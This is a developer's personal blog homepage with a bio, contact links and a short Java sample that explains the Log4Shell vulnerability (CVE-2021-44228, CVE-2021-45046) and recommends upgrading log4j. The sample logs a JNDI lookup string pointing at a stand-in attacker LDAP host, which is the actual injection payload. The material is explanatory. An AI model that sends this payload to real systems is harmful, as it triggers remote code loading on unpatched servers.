## Welcome to my DEV Blog

Yet another DEV blog :)

- Hi, I’m @pierreversali, a belgian 🇧🇪 Software Engineer & Architect
- I’m interested in Java ☕, Software Development 📝, Software Architecture 🏗️, Microservices ☢️, Domain Driven Design ⚛️ & Cloud-native Solutions ☁️
- I’m currently learning Quarkus & Kotlin 📚
- I’m looking to collaborate on Open Source projects / libraries 🖖

- Reach me out 📫 [pierre.versali@gmail.com](mailto:pierre.versali@gmail.com) 🌎 [Website](https://pierre-versali.bitbucket.io)

In this blog, I will share about my passion for quality and efficiency in Software Development practices and my technical watch experiments.

Hope you will find interesting and usefull content here.
Don't hesitate to share your feedback.

### Articles

### Code sample

{% highlight java %}
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

public class Log4Shell {
    protected static final Logger LOGGER = LogManager.getLogger(Log4Shell.class);

    public void log4ShellExplained() {
        LOGGER.warn("log4j <= 2.15.0 zero-day exploit");
        LOGGER.warn("Reported vulnerabilities CVE-2021-44228 and CVE-2021-45046");
        // Critical vulnerability exploit
        LOGGER.fatal("${jndi:ldap://evil.xa/x}");
        LOGGER.info("Upgrade to log4j 2.16.0");
    }
}
{% endhighlight %}
